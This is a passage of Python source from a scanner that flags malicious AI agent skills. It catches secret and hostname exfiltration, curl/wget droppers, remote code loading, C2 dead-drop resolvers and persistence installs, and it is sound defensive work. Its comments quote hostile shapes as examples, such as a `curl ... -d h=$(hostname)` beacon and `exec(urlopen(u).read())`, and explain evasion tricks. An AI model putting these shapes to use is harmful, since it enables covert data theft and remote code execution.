    if "environ" in source or "getenv" in source or _AGENT_CONFIG_PATH_RE.search(source):
        env_src_tainted = _env_tainted_names(tree) | _agent_config_file_tainted_names(source, tree)
        for node in ast.walk(tree):
            if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
                continue
            # Only a BODY / URL / params position counts. A secret in headers=/auth= is the
            # normal way a skill authenticates to its own API (env key -> Authorization
            # header) and is NOT flagged; exfiltration puts the secret in the URL, request
            # body, query params, or a positional argument.
            arg_subtrees = [
                *node.args,
                *(kw.value for kw in node.keywords if kw.arg not in _ENV_AUTH_KWARGS),
            ]
            hit = False
            for arg in arg_subtrees:
                if env_src_tainted and (_names_in(arg) & env_src_tainted):
                    hit = True
                    break
                if any(
                    _is_env_read_value(s) or _rhs_has_subscript_environ(s) for s in ast.walk(arg)
                ):
                    hit = True
                    break
            if hit:
                add(
                    "ENV_EXFIL_FLOW",
                    "info",
                    getattr(node, "lineno", 0),
                    "an environment-variable or agent-config secret flows into a network "
                    "sink's URL or body — verify the destination is trusted (possible exfiltration)",
                )

    # C-203: HOST_INFO_EXFIL_FLOW — host/machine-identity info (hostname, platform/uname,
    # git remote) reaching an outbound sink: covert telemetry / phone-home. Two shapes:
    # (a) a Python network-library call (_is_net_sink) whose URL/body/params carries a
    #     host-info-tainted value or an inline host-info call; (b) a shell-exec sink
    #     (os.system/os.popen/subprocess) whose command string contains BOTH a curl/wget
    #     fetch AND a host-identity signal — covers the concat-built
    #     `'curl -s ' + URL + '/eval_chain -d h=$(hostname)'` shape that has no single
    #     contiguous literal for a plain curl|sh regex to match. Severity "info" — WARN-first,
    #     same rationale as ENV_EXFIL_FLOW (crash-reporters/telemetry are dual-use).
    if _HOST_INFO_SIGNAL_RE.search(source):
        host_src_tainted = _host_info_tainted_names(tree)
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            ln = getattr(node, "lineno", 0)
            if _is_net_sink(node.func, net_sink_aliases):
                arg_subtrees = [
                    *node.args,
                    *(kw.value for kw in node.keywords if kw.arg not in _ENV_AUTH_KWARGS),
                ]
                hit = False
                for arg in arg_subtrees:
                    if host_src_tainted and (_names_in(arg) & host_src_tainted):
                        hit = True
                        break
                    if any(
                        _is_host_info_call(s) or _is_git_remote_read(s) for s in ast.walk(arg)
                    ):
                        hit = True
                        break
                if hit:
                    # C-223: a literal destination matching the skill's OWN declared
                    # endpoint host is DISCLOSED, not covert -- reword rather than
                    # silence entirely (C-135: the declared host is self-reported by
                    # the same skill being scanned, so it proves the destination
                    # isn't HIDDEN, not that it's trustworthy; a full drop would let
                    # an attacker erase the only signal for free just by echoing
                    # their own exfil host into SKILL.md). A non-literal/dynamic URL
                    # can't be resolved statically, so it keeps the plain wording
                    # (safe default).
                    dest_host = _url_literal_host(node.args[0]) if node.args else None
                    if _host_matches_own(dest_host, own_host):
                        add(
                            "HOST_INFO_EXFIL_FLOW",
                            "info",
                            ln,
                            "verify independently — self-declaration alone doesn't prove the "
                            "destination is trustworthy — host/machine-identity info "
                            "(hostname/platform/git-remote) flows into a network sink matching "
                            "the skill's OWN declared endpoint (disclosed, not covert)",
                        )
                    else:
                        add(
                            "HOST_INFO_EXFIL_FLOW",
                            "info",
                            ln,
                            "host/machine-identity info (hostname/platform/git-remote) flows "
                            "into a network sink — verify the destination is trusted (possible "
                            "covert telemetry / phone-home)",
                        )
                continue
            is_shell_exec, shell_sink_desc = _is_exec_sink_call(node.func)
            if not is_shell_exec:
                continue
            for arg in (*node.args, *(kw.value for kw in node.keywords)):
                literal_pieces = [
                    n.value
                    for n in ast.walk(arg)
                    if isinstance(n, ast.Constant) and isinstance(n.value, str)
                ]
                has_curl = any(_CURL_LIKE_RE.search(p) for p in literal_pieces)
                if not has_curl:
                    continue
                has_shell_subst = any(_SHELL_HOST_SUBST_RE.search(p) for p in literal_pieces)
                has_host_signal = has_shell_subst or any(
                    _is_host_info_call(s) or _is_git_remote_read(s) for s in ast.walk(arg)
                ) or bool(host_src_tainted and (_names_in(arg) & host_src_tainted))
                if has_host_signal:
                    add(
                        "HOST_INFO_EXFIL_FLOW",
                        "info",
                        ln,
                        f"a {shell_sink_desc} shell command built with a curl/wget fetch AND a "
                        "host-identity value (hostname/whoami/git-remote) — possible covert "
                        "telemetry beacon",
                    )
                    break

    # B-342 (T09/SkillTrustBench V_EXCESSIVE_TELEMETRY): EXCESSIVE_TELEMETRY_FLOW — a
    # function combining >=2 over-collection axes (bulk env dump, recursive/bulk
    # filesystem walk, bulk directory listing, shell/command-history file read) whose
    # value reaches a network sink. See the constant block near _TELEMETRY_SIGNAL_RE
    # (top of file) for the full rationale, including why the disclosure gate — not
    # this AST shape alone — is what actually separates a hidden collector from a
    # disclosed, legitimate telemetry/diagnostics/backup skill.
    if _TELEMETRY_SIGNAL_RE.search(source):
        collector_funcs = _telemetry_collector_funcnames(tree)
        if collector_funcs:
            telemetry_tainted = _telemetry_tainted_names(tree, collector_funcs)
            for node in ast.walk(tree):
                if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
                    continue
                arg_subtrees = [
                    *node.args,
                    *(kw.value for kw in node.keywords if kw.arg not in _ENV_AUTH_KWARGS),
                ]
                hit = False
                for arg in arg_subtrees:
                    if telemetry_tainted and (_names_in(arg) & telemetry_tainted):
                        hit = True
                        break
                    if any(
                        isinstance(n, ast.Call)
                        and isinstance(n.func, ast.Name)
                        and n.func.id in collector_funcs
                        for n in ast.walk(arg)
                    ):
                        hit = True
                        break
                if hit:
                    add(
                        "EXCESSIVE_TELEMETRY_FLOW",
                        "info",
                        getattr(node, "lineno", 0),
                        "a function collects data across multiple over-collection axes "
                        "(bulk env-var dump, recursive/bulk filesystem or directory "
                        "enumeration, or a shell/command-history file read) and the "
                        "assembled value flows into a network sink — verify this is "
                        "disclosed telemetry, not a hidden collector",
                    )

    # C-205: DROPPER_DOWNLOAD_TO_TMP — an argv-list curl/wget subprocess call staging a
    # script into a writable/tmp-like path, with no literal pipe for B100's regex to
    # match (the URL is typically a variable too). Checked independently of the loops
    # above — this is a shape check on the argv list, not a taint flow.
    for node in ast.walk(tree):
        if not _is_curl_wget_argv_call(node):
            continue
        out_path = _curl_dropper_output_path(node)
        if (
            out_path
            and out_path.startswith(_WRITABLE_PATH_PREFIXES)
            and out_path.lower().endswith(_SCRIPT_LIKE_EXTS)
        ):
            # C-224: a literal URL on the curated first-party installer allowlist
            # (fixed project data, not skill-influenceable) skips — matches B100's
            # own established behavior for the identical allowlist, so the download-
            # then-exec form of a trusted installer URL is no longer WARN-only while
            # the piped form of the SAME URL already passes.
            url_literal = _curl_dropper_url_literal(node)
            if url_literal and _is_trusted_installer_url(url_literal):
                continue
            add(
                "DROPPER_DOWNLOAD_TO_TMP",
                "info",
                getattr(node, "lineno", 0),
                f"curl/wget argv-list call downloads a script to a writable path "
                f"({out_path}) — staged dropper shape (no literal pipe, evades a plain "
                "curl|sh match)",
            )

    # TUNNEL_LAUNCH_ARGV — an argv-list tunnel/mesh-VPN launch
    # primitive (see the module comment above `_TUNNEL_ARGV_BARE_PROGRAMS`). info (not
    # crit), matching DROPPER_DOWNLOAD_TO_TMP/CHUNKED_FILE_EXEC's grade — checks/_vet.py's
    # check_installed_skills routes this rule through its own explicit continue-branch
    # (mirrors CHUNKED_FILE_EXEC's guard), so it can never become FAIL-capable there
    # regardless of this severity label; checks/_content.py's check_tunnel_enrollment
    # (B338) is this rule's sole consumer and stays WARN-only by design.
    for node in ast.walk(tree):
        if not _is_tunnel_launch_argv_call(node):
            continue
        prog_elts = _argv_str_elts(node.args[0])
        argv_repr = ", ".join(repr(e) for e in prog_elts[:4])
        add(
            "TUNNEL_LAUNCH_ARGV",
            "info",
            getattr(node, "lineno", 0),
            f"argv-list subprocess call launches a tunnel/mesh-VPN primitive: "
            f"[{argv_repr}] — the idiomatic Python form a text-regex scan of the same "
            "skill's source would miss",
        )

    # B336: CHUNKED_FILE_EXEC — a locally-defined helper reads and joins multiple
    # chunked/part files at runtime, and the assembled result is exec()'d/eval()'d — the
    # split-by-file scanner-evasion loader shape. info (not crit): a corroborated-but-new
    # heuristic; checks/_vet.py's check_installed_skills routes this rule through its own
    # explicit continue-branch, so it can never reach that function's generic crit/
    # cred-exfil FAIL fallthrough regardless of this severity label.
    for _cf_ln, _cf_reason in _chunked_file_exec_findings(tree):
        add("CHUNKED_FILE_EXEC", "info", _cf_ln, _cf_reason)

    # B-284: remote-fetch -> exec/eval through ONE local-helper return hop, the form
    # TT5_CMD_INJECTION below does not reach. crit, like TT5: bytes downloaded at
    # runtime and executed are a remote code loader by construction.
    for _rcl_ln, _rcl_reason in _remote_code_load_findings(tree):
        add("REMOTE_CODE_LOAD", "crit", _rcl_ln, _rcl_reason)

    # B-284: remote fetch -> write to a literal path -> execute that path. The file write
    # breaks name-level taint, so TT5 below cannot reach it.
    for _se_ln, _se_path in _staged_exec_findings(tree, _remote_fetch_tainted_names(tree)):
        add(
            "REMOTE_STAGED_EXEC",
            "crit",
            _se_ln,
            f"content fetched from a remote URL is written to {_se_path} and that path is "
            "then executed — staged remote code execution",
        )

    # F-159: dead-drop C2 resolver — periodic poll -> decode -> exec (see the module
    # comment above `_SLEEP_BASES`). confirmed dataflow is crit -> FAIL; the three
    # ingredients merely co-located (no confirmed dataflow) is info -> WARN only.
    # list_bindings_by_call (already computed above, B-132) is threaded through so a
    # subprocess command bound to a local variable is still resolved to its fixed
    # argv list for the command-vs-data-argument split (F-159 follow-up).
    _dd_confirmed, _dd_ambiguous = _deaddrop_resolver_findings(tree, list_bindings_by_call)
    for _dd_ln, _dd_reason in _dd_confirmed:
        add("DEADDROP_RESOLVER", "crit", _dd_ln, _dd_reason)
    for _dd_ln, _dd_reason in _dd_ambiguous:
        add("DEADDROP_RESOLVER_AMBIGUOUS", "info", _dd_ln, _dd_reason)

    # Extended taint rules: TT5 (external-input -> exec), TT4 (file-read -> network),
    # SSRF (tainted URL -> network-fetch).  Compute external taint once and reuse.
    # B-413 layer 1: scope-bucketed, reusing the SAME owner_map/parent_scope/
    # shadow_cache/list_bindings_by_call already built above for the decode->exec
    # taint rule (never recomputed).
    func_param_taint = _func_param_taint_by_scope(tree, owner_map, parent_scope)
    ext_taint_map = _external_tainted_names(
        tree, func_param_taint, owner_map, parent_scope, shadow_cache, ref_res=ref_res
    )

    # B-917: loader sinks (runpy/importlib/zipimport execute a FILE by path, not a
    # name reference) and staged-import correlation (a write followed by an import
    # whose search path resolves to the same location) -- see the `_b917_*` helpers
    # above and shippedexec.Loc/loc_eq for the shared location model.
    for _ldr_rule, _ldr_sev, _ldr_ln, _ldr_reason in _b917_findings(
        tree, filename, artifact, facts=facts
    ):
        add(_ldr_rule, _ldr_sev, _ldr_ln, _ldr_reason)

    # B-863: one cache per FILE (never per call), keyed by wrapper function inside
    # `_b863_tier1_tier2_verdict` -- the channel walk it memoizes is the expensive
    # part, and a file can have many sink calls into the same small set of wrappers.
    layer2_cache: dict = {}
    # B-916: `ext_taint_map` only tracks NAMES bound to an external source, so a file
    # whose only external input is read straight into an exec/eval/os.system/os.popen/
    # subprocess.* sink -- no intermediate variable at all, e.g.
    # `exec(urlopen(u).read(), {})` -- has an EMPTY map, and this whole pass used to be
    # skipped outright before a single call was even examined. Cheap, separate pre-scan
    # (same style as the other one-shot `ast.walk(tree)` passes already above this one):
    # only exec-sink calls are considered, and only their own arguments are walked.
    # B-906: `ref_res.source_in(a)` alongside `_value_is_tainted_source` so a file
    # whose ONLY inline exec-sink argument is a positively-resolved source (e.g.
    # `subprocess.check_call([os.environ["P"], "x"])`, no bound Name anywhere) still
    # enters the pass below instead of being skipped outright at this gate.
    _has_inline_exec_sink_source = any(
        _is_exec_sink_call(n.func)[0]
        and any(
            _value_is_tainted_source(a, set()) or ref_res.source_in(a)
            for a in list(n.args) + [kw.value for kw in n.keywords]
        )
        for n in ast.walk(tree)
        if isinstance(n, ast.Call)
    )

    if ext_taint_map or _has_inline_exec_sink_source:
        # This is the TT5/TT4/SSRF taint pass — the one whose INTER-pass starvation
        # (round 1) was the concrete repro (a TT5_CMD_INJECTION crit lost behind 25+
        # earlier DANGEROUS_SINK info findings from the loop above). It is ALSO,
        # itself, a mixed-severity pass exactly like the first loop above
        # (TT5_CMD_INJECTION crit alongside TT5_ARG_INJECTION/TT4_FILE_NET/TT_SSRF
        # info in the same walk), so — per the module-level comment above
        # `_MAX_FINDINGS_PER_FILE` (round 3) — it has no per-pass ceiling of its own
        # either; every candidate reaches `out` and the final severity-ordered
        # truncation at `return` is the sole enforcement point.
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            ln = getattr(node, "lineno", 0)

            # TT5: tainted value flows into exec/eval/os.system/os.popen/subprocess.*
            is_exec, exec_name = _is_exec_sink_call(node.func)
            if is_exec:
                ext_visible = _tainted_names_visible(
                    node, ext_taint_map, owner_map, parent_scope, shadow_cache
                )
                any_t, direct = _call_args_tainted_for_exec_sink(node, ext_visible, ref_res=ref_res)
                # B-638: the tainted input is exactly the read of a file this artifact
                # ships (see the OBFUSCATED_EXEC site above).
                if any_t and shipped_exec is not None and (
                    (ln, node.col_offset) in shipped_exec or (ln, node.col_offset) in unshipped_exec
                ):
                    continue
                if any_t:
                    # B-752: a decode-shaped, provably artifact-relative file read (the
                    # setup.py idiom) is not external input merely because open()/.read()
                    # unconditionally count as an external source for TT5's general case.
                    # Exempt ONLY when every tainted name this call's own arguments reach
                    # is explained by exactly that pattern; any other tainted name
                    # reaching the sink -- a mixed expression, a real decode primitive
                    # layered on top -- still convicts below.
                    # B-638: a token proxy, so only when the caller had no artifact --
                    # see the OBFUSCATED_EXEC site's merge note above for why this gate
                    # stays even with the B-850 recognizer behind it.
                    # B-916: an arg can now also be tainted by an INLINE source call
                    # with no name at all (see `_call_args_tainted_for_exec_sink`) --
                    # `_exec_sink_taint_is_only_artifact_relative_decode` only explains
                    # NAME-based taint, so an arg whose sole taint is inline must not be
                    # waved through by the old `not (_names_in(_a) & ext_visible)`
                    # shortcut, which was vacuously true for it (no NAME to find) before
                    # this rule could ever see an inline-only taint to begin with.
                    # B-906: same reasoning for a positively-resolved inline source
                    # (`ref_res.source_in(_a)`) -- without `not ref_res.source_in(_a)`
                    # here too, an arg tainted ONLY by a resolved env-read would be
                    # vacuously "explained" by this exemption's first disjunct (neither
                    # `_names_in` nor `_value_is_tainted_source` sees it) and silently
                    # waved through -- the exact B-916 failure this site already
                    # documents, for the new resolver instead of the old one.
                    _all_args = list(node.args) + [kw.value for kw in node.keywords]
                    if shipped_exec is None and _all_args and all(
                        (
                            not (_names_in(_a) & ext_visible)
                            and not _value_is_tainted_source(_a, ext_visible)
                            and not ref_res.source_in(_a)
                        )
                        or _exec_sink_taint_is_only_artifact_relative_decode(
                            _a,
                            ext_visible,
                            tree,
                            filename,
                            path_aliases,
                        )
                        for _a in _all_args
                    ):
                        # B394 (B-850 round 2): the exemption above covers BOUNDED
                        # *and* UNPROVEN reads alike (never proven to escape), but
                        # only BOUNDED is silently absolved -- an UNPROVEN read is
                        # disclosed here the same way the direct exec()/eval() branch
                        # already discloses it (OBFUSCATED_EXEC, above), instead of
                        # producing zero signal at all for a shell/subprocess sink.
                        for _a in _all_args:
                            if _names_in(_a) & ext_visible:
                                for _up_ln, _up_reason in _containment_unproven_decode_findings(
                                    _a, tree, filename, path_aliases
                                ):
                                    add("ARTIFACT_READ_UNPROVEN", "info", _up_ln, _up_reason)
                        continue
                    # A subprocess argv-list call (shell=False, fixed program) is only
                    # argument injection, not command injection — do not escalate to crit.
                    # B-413 layer 2: also downgraded when EVERY intra-file call site to
                    # a wrapper function binds this tainted parameter to a hardcoded,
                    # untainted-program argv list — see
                    # _subprocess_taint_is_command_injection's own docstring.
                    if exec_name.startswith(
                        "subprocess."
                    ) and not _subprocess_taint_is_command_injection(
                        node,
                        ext_visible,
                        list_bindings_by_call.get(node),
                        tree=tree,
                        owner_map=owner_map,
                        parent_scope=parent_scope,
                        shadow_cache=shadow_cache,
                        ext_taint_map=ext_taint_map,
                        list_bindings_by_call=list_bindings_by_call,
                        func_param_taint=func_param_taint,
                        layer2_cache=layer2_cache,
                        ref_res=ref_res,
                    ):
                        add(
                            "TT5_ARG_INJECTION",
                            "info",
                            ln,
                            f"external input flows into {exec_name} as a non-program list argument "
                            "(shell=False) — argument injection, not command injection",
                        )
                        continue
                    flow_kind = "direct" if direct else "indirect"
                    add(
                        "TT5_CMD_INJECTION",
                        "crit",
                        ln,
                        f"external input flows into {exec_name} ({flow_kind} flow) — command/code injection",
                    )
                    continue

            # TT4: file-read tainted value flows into a data-bearing network sink.
            is_net_data, net_name = _is_net_out_data_sink(node.func)
            if is_net_data:
                file_t = _file_tainted(source, tree)
                if file_t:
                    any_t, direct = _call_args_tainted(node, file_t)
                    if any_t:
                        flow_kind = "direct" if direct else "indirect"
                        add(
                            "TT4_FILE_NET",
                            "info",
                            ln,
                            f"file-read contents flow into {net_name} ({flow_kind} flow) — data exfiltration risk",
                        )
                    continue

            # SSRF: externally-tainted value flows into a network-fetch URL argument.
            is_ssrf_s, ssrf_name = _is_ssrf_sink_call(node.func)
            if is_ssrf_s:
                ext_visible = _tainted_names_visible(
                    node, ext_taint_map, owner_map, parent_scope, shadow_cache
                )
                any_t, direct = _call_args_tainted(node, ext_visible)
                if any_t:
                    # Elevate evidence when a literal internal endpoint appears in the file.
                    has_internal = bool(_SSRF_LITERAL_RE.search(source))
                    flow_kind = "direct" if direct else "indirect"
                    if has_internal:
                        add(
                            "TT_SSRF",
                            "info",
                            ln,
                            f"externally-controlled URL flows into {ssrf_name} with internal endpoint literal present ({flow_kind} flow) — SSRF",
                        )
                    else:
                        add(
                            "TT_SSRF",
                            "info",
                            ln,
                            f"externally-controlled URL flows into {ssrf_name} ({flow_kind} flow) — SSRF risk",
                        )

    out.extend(_conditional_sink_findings(tree))
    out.extend(_shell_injection_risk_findings(tree))

    # B-140(a): os.environ["KEY"] = "<provider-shaped-literal>" — an unconditional
    # overwrite of an env var with a hardcoded provider-shaped token. A separate small
    # loop (rather than folding into the ast.Call walk above) since Assign is a
    # different node shape and the Call loop's control flow is continue-heavy.
    for node in ast.walk(tree):
        if not isinstance(node, ast.Assign):
            continue
        if len(node.targets) != 1:
            continue
        target = node.targets[0]
        if not isinstance(target, ast.Subscript):
            continue
        tv = target.value
        is_os_environ = (
            isinstance(tv, ast.Attribute) and tv.attr == "environ" and _attr_base(tv.value) == "os"
        ) or (isinstance(tv, ast.Name) and tv.id == "environ")
        if not is_os_environ:
            continue
        if not _is_hardcoded_provider_secret(node.value):
            continue
        key_node = target.slice
        # Python 3.9 compat: a subscript slice may be wrapped in ast.Index.
        if key_node.__class__.__name__ == "Index":
            key_node = key_node.value  # type: ignore[attr-defined]
        key_repr = (
            key_node.value
            if isinstance(key_node, ast.Constant) and isinstance(key_node.value, str)
            else "<dynamic>"
        )
        add(
            "HARDCODED_PROVIDER_SECRET",
            "crit",
            getattr(node, "lineno", 0),
            f"hardcoded provider-shaped secret written to os.environ[{key_repr!r}]",
        )

    # B-740: a plain assignment of a provider-shaped literal — e.g. module-level
    # `STRIPE_SECRET_KEY = "sk_live_..."` — reached neither os.environ-entangled shape
    # above and produced NO finding at all. Third call site of the same
    # `_is_hardcoded_provider_secret` predicate (the predicate itself is unchanged);
    # `ast.walk` does not distinguish scope, so this also catches the identical shape
    # inside a function body or a class body (a class attribute target is `ast.Name`
    # too), not only true module level. Only a single, simple `Name` target is matched
    # — a tuple/attribute/subscript target, or a value that isn't a plain string
    # constant (an f-string, a `+` concatenation, a name reference), is left alone; a
    # value split across adjacent string-literal boundaries (`"a" "b"`) still matches,
    # since Python folds those into one `ast.Constant` before this ever runs.
    #
    # C-135 note (B-893, supersedes the B-740 note this replaces): the B-740 note above
    # called the corpus's `tests/conftest.py` MOCK_* fixture shape "pre-existing,
    # shared" with the two os.environ-entangled call sites above. That was wrong for
    # THIS shape specifically — measured on the SkillTrustBench corpus (B-543
    # re-measure, 2026-09-23): this plain-assignment site alone produced 32 new
    # gold-normal FAILs (FP_TEST_FIXTURE class, `tests/conftest.py` `MOCK_*`
    # assignments, one byte-identical template with 0 pytest-shape signals) that did
    # NOT exist before this call site shipped in v4.2.1 — the two env-entangled sites
    # require actual `os.environ`/`getenv` entanglement, which a plain mock assignment
    # never has, so they never reproduced these FAILs. The 32 FAILs are new in v4.2.1,
    # not pre-existing.
    #
    # Fix (Dave's D2 on B-543): this call site gets its OWN rule name,
    # `HARDCODED_PROVIDER_SECRET_ASSIGN`, distinct from `HARDCODED_PROVIDER_SECRET`
    # (kept unchanged on the two env-entangled sites above, which stay crit/FAIL). The
    # routing decision — WARN for an ordinary file, evidence-only (never a verdict
    # winner) inside a test-fixture-named file — lives downstream in
    # `checks/_vet.py`'s B13 AST loop and `_AST_NEVER_FAIL_RULES`, keyed on the new
    # rule name; this Layer-1 module makes no test-fixture-path judgment itself, so no
    # Layer-2 import is needed here (the prior note's "banned reverse dependency"
    # concern is moot once routing is name-keyed rather than path-keyed in this file).
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign):
            if len(node.targets) != 1 or not isinstance(node.targets[0], ast.Name):
                continue
            target_name = node.targets[0].id
            value_node = node.value
        elif isinstance(node, ast.AnnAssign):
            if not isinstance(node.target, ast.Name) or node.value is None:
                continue
            target_name = node.target.id
            value_node = node.value
        else:
            continue
        if not _is_hardcoded_provider_secret(value_node):
            continue
        add(
            "HARDCODED_PROVIDER_SECRET_ASSIGN",
            "crit",
            getattr(node, "lineno", 0),
            f"hardcoded provider-shaped secret assigned to {target_name!r}",
        )

    # F-177/B375: sitecustomize/PYTHONSTARTUP persistence install, scoped to a single
    # function — see the module comment above `_AST_SITECUSTOMIZE_TARGET_RE`.
    for _pi_ln, _pi_mech, _pi_fn in _persist_install_function_findings(tree):
        if _pi_mech == "A":
            add(
                "SITECUSTOMIZE_SCOPED_INSTALL",
                "info",
                _pi_ln,
                f"{_pi_fn}() computes a site-packages sitecustomize/usercustomize "
                "target and opens a file for write/append — auto-execution "
                "persistence install (mechanism A)",
            )
        else:
            add(
                "PYTHONSTARTUP_SCOPED_INSTALL",
                "info",
                _pi_ln,
                f"{_pi_fn}() names a shell-rc path and a PYTHONSTARTUP assignment "
                "while opening a file for write/append — PYTHONSTARTUP persistence "
                "install (mechanism B)",
            )

    if len(out) <= _MAX_FINDINGS_PER_FILE:
        return out

    # More candidates survived the per-PASS budgets above than the
    # per-FILE cap allows overall. Truncate by SEVERITY, never by discovery order — a
    # crit a later pass found must outrank an earlier pass's info findings, not lose to
    # them just because that pass ran first and filled `out` first. `sorted` is stable,
    # so within one severity, findings keep the discovery order they already had —
    # deterministic, not an artifact of dict/set iteration order. One slot is reserved
    # for an explicit disclosure finding, so a capped file reads as visibly incomplete
    # (never silently "clean beyond what was reported") while the return value still
    # honors `len(out) <= _MAX_FINDINGS_PER_FILE` for every caller of this function.
    kept = sorted(out, key=lambda f: -_ast_severity_rank(f.severity))[: _MAX_FINDINGS_PER_FILE - 1]
    suppressed = len(out) - len(kept)
    kept.append(
        ASTFinding(
            "AST_FINDINGS_TRUNCATED",
            "info",
            0,
            f"{suppressed} additional lower-priority AST/taint finding(s) suppressed by "
            f"the per-file cap ({_MAX_FINDINGS_PER_FILE}) — this file's findings are "
            "incomplete; crit findings are kept ahead of info ones",
        )
    )
    return kept


# B-190: a secret placed in headers=/auth=/cert= is deliberately excluded from
# ENV_EXFIL_FLOW above (_ENV_AUTH_KWARGS) because that's the normal way a skill
# authenticates to its own API. But the exclusion happens INSIDE analyze_python's own
# loop, before any ASTFinding is ever created — so unlike other "info"-severity findings
# that get silently dropped by check_installed_skills' cascade (still visible to
# adjudication.py's _recover_dropped_taint, which re-runs analyze_python), this case is
# never computed at all and so can never reach even the advisory judge-packet. This
# sibling walk computes exactly the excluded case, always "info" severity, for
# adjudication.py to surface as an UNKNOWN judge-packet item. Never called from
# analyze_python or CHECKS — check_installed_skills' PASS/WARN/FAIL cascade never sees
# these findings, so this cannot introduce a new false-FAIL (Golden Rule #5).
def analyze_env_auth_kwarg_exfil(source: str, filename: str = "<skill>") -> list[ASTFinding]:
    try:
        tree = ast.parse(source)
    except (SyntaxError, ValueError, RecursionError, MemoryError, OverflowError):
        return []
    if (
        "environ" not in source
        and "getenv" not in source
        and not _AGENT_CONFIG_PATH_RE.search(source)
    ):
        return []

    env_src_tainted = _env_tainted_names(tree) | _agent_config_file_tainted_names(source, tree)
    net_sink_aliases = _net_sink_alias_names(tree)
    out: list[ASTFinding] = []
    seen: set[int] = set()
    for node in ast.walk(tree):
        if len(out) >= _MAX_FINDINGS_PER_FILE:
            break
        if not (isinstance(node, ast.Call) and _is_net_sink(node.func, net_sink_aliases)):
            continue
        auth_kwarg_subtrees = [kw.value for kw in node.keywords if kw.arg in _ENV_AUTH_KWARGS]
        hit = False
        for arg in auth_kwarg_subtrees:
            if env_src_tainted and (_names_in(arg) & env_src_tainted):
                hit = True
                break
            if any(
                _is_env_read_value(s) or _rhs_has_subscript_environ(s) for s in ast.walk(arg)
            ):
                hit = True
                break
        if not hit:
            continue
        lineno = getattr(node, "lineno", 0)
        if lineno in seen:
            continue
        seen.add(lineno)
        # C-340: surface the destination host when the URL is a plain string literal
        # (the same resolver B-190's sibling walk already uses, line ~3115) so the
        # host-agent judge adjudicating this UNKNOWN has something concrete to check —
        # "verify the destination is trusted" with no destination was nothing to verify.
        # A variable/f-string URL can't be resolved statically; the message stays
        # generic rather than guessing (never fabricate a host).
        dest_host = _url_literal_host(node.args[0]) if node.args else None
        detail = (
            "an environment-variable or agent-config secret is placed in an "
            "auth-shaped keyword (headers/auth/cert) of a network call — the normal "
            "way a skill authenticates to its own API, but never independently "
            "reviewed; verify the destination is trusted"
            + (f" (destination: {dest_host})" if dest_host else "")
        )
        out.append(ASTFinding("ENV_AUTH_KWARG_EXFIL", "info", lineno, detail))
    return out


# --- Abstract Effect Simulator ---


def _sink_key(effect_type, sink_name, guards):
    """Hashable identity for a reached-sink entry (B-192). `simulate()` already
    collapses `reached_sinks` downstream to the distinct (effect, sink) set plus the
    distinct guard-description set per sink — so merging exact-duplicate entries
    (same effect + sink + guard combination) here changes no downstream finding; it
    only stops the same duplicate from being re-copied at every nesting level."""
    return (
        effect_type,
        sink_name,
        tuple((g["condition_type"], g["description"]) for g in guards),
    )


class State:
    def __init__(self):
        self.tainted_vars = set()
        self.active_guards = []
        self.reached_sinks = []
        self._sink_keys = set()
        self.terminated = False
        self.loop_broken = False
        self.loop_continued = False
        self.reachable_effects = set()

    def copy(self):
        new_state = State()
        new_state.tainted_vars = set(self.tainted_vars)
        new_state.active_guards = [dict(g) for g in self.active_guards]
        new_state.reached_sinks = list(self.reached_sinks)
        new_state._sink_keys = set(self._sink_keys)
        new_state.terminated = self.terminated
        new_state.loop_broken = self.loop_broken
        new_state.loop_continued = self.loop_continued
        new_state.reachable_effects = set(self.reachable_effects)
        return new_state

    def register_effect(self, effect_type, sink_name):
        self.reachable_effects.add(effect_type)
        guards = [dict(g) for g in self.active_guards]
        key = _sink_key(effect_type, sink_name, guards)
        if key in self._sink_keys:
            return
        self._sink_keys.add(key)
        self.reached_sinks.append(
            {"effect": effect_type, "sink": sink_name, "guards": guards}
        )
        if len(self.reached_sinks) > _MAX_REACHED_SINKS:
            raise ScanBudgetExceeded

    def merge_reached(self, other):
        """Fold `other`'s reached_sinks into self, deduped (B-192) — used wherever
        simulate_if/simulate_loop used to `.extend()` two ever-growing lists."""
        for item in other.reached_sinks:
            key = _sink_key(item["effect"], item["sink"], item["guards"])
            if key in self._sink_keys:
                continue
            self._sink_keys.add(key)
            self.reached_sinks.append(item)
            if len(self.reached_sinks) > _MAX_REACHED_SINKS:
                raise ScanBudgetExceeded


class EffectSimulator:
    def __init__(self, source: str, filename: str = "<skill>"):
        self.source = source
        self.filename = filename
        try:
            self.tree = ast.parse(source)
        except Exception:
            self.tree = None

    def get_entry_points(self):
        if not self.tree:
            return []
        entries = []
        for node in self.tree.body:
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                entries.append(node)
        # If no function definition, treat the whole module as entry point
        if not entries and self.tree.body:
            entries.append(self.tree)
        return entries

    def get_assigned_variables(self, nodes):
        vars_set = set()

        def walk_and_collect(n):
            if isinstance(n, ast.Assign):
                for t in n.targets:
                    collect_targets(t)
            elif isinstance(n, ast.AnnAssign):
                collect_targets(n.target)
            elif isinstance(n, ast.AugAssign):
                collect_targets(n.target)
            elif isinstance(n, ast.For):
                collect_targets(n.target)
            elif isinstance(n, ast.Call):
                if isinstance(n.func, ast.Attribute) and isinstance(n.func.value, ast.Name):
                    if n.func.attr in ("append", "extend", "insert", "update", "add"):
                        vars_set.add(n.func.value.id)
            for child in ast.iter_child_nodes(n):
                walk_and_collect(child)

        def collect_targets(target):
            if isinstance(target, ast.Name):
                vars_set.add(target.id)
            elif isinstance(target, (ast.Tuple, ast.List)):
                for elt in target.elts:
                    collect_targets(elt)
            elif isinstance(target, ast.Attribute):
                if isinstance(target.value, ast.Name):
                    vars_set.add(target.value.id)
            elif isinstance(target, ast.Subscript):
                if isinstance(target.value, ast.Name):
                    vars_set.add(target.value.id)

        for node in nodes:
            walk_and_collect(node)

        return vars_set

    def check_expr_taint_sources(self, node, state, seed):
        if isinstance(node, ast.Name):
            if node.id in state.tainted_vars:
                return True

        if seed == "poisoned-MCP":
            if isinstance(node, ast.Call):
                func_name = ""
                if isinstance(node.func, ast.Name):
                    func_name = node.func.id
                elif isinstance(node.func, ast.Attribute):
                    func_name = node.func.attr
                if "mcp" in func_name.lower() or "call_tool" in func_name.lower():
                    return True
